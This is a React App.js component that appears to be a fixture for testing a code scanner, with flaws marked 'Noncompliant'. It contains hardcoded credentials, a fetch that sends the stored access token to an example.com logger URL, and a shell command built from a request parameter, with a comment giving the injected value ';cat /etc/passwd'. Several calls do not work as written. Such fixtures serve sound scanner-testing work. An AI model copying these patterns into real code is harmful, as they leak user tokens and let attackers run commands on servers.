import React from 'react'
import logo from './logo.svg'
import './App.css'
import { getLocation } from './Location'

function App() {
  const { hostname, pathname } = getLocation()
  console.log('A')
  console.log('B')

  const teste = {
    login: 'douglas',
    password: 'teste.js',
  }
  var db = logo.openDatabase(
    'myDb',
    '1.0',
    'Personal secrets stored here',
    2 * 1024 * 1024,
  ) // Noncompliant
  if (JSON.parse('\\{"teste": "teste"\\})') === 'teste') {
    alert('Unexpected Condition')
    fetch(
      'http://example.com/logger.php?token=' + localStorage.access_token,
    ).then((response) => {
      localStorage.setItem('teste', response.body)
      console.log({ localStorage })
    })
  }

  function teste555(req, res) {
    const cmd = 'ls ' + req.query.arg

    const out = cp.execSync(cmd) // Noncompliant: example of a command injection, req.query.arg = -la . ;cat /etc/passwd
  }
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} href={teste555()} className="App-logo" alt="logo" />
        <p data-cy="location">
          {hostname} {pathname}{' '}
        </p>
      </header>
    </div>
  )
}

export default App
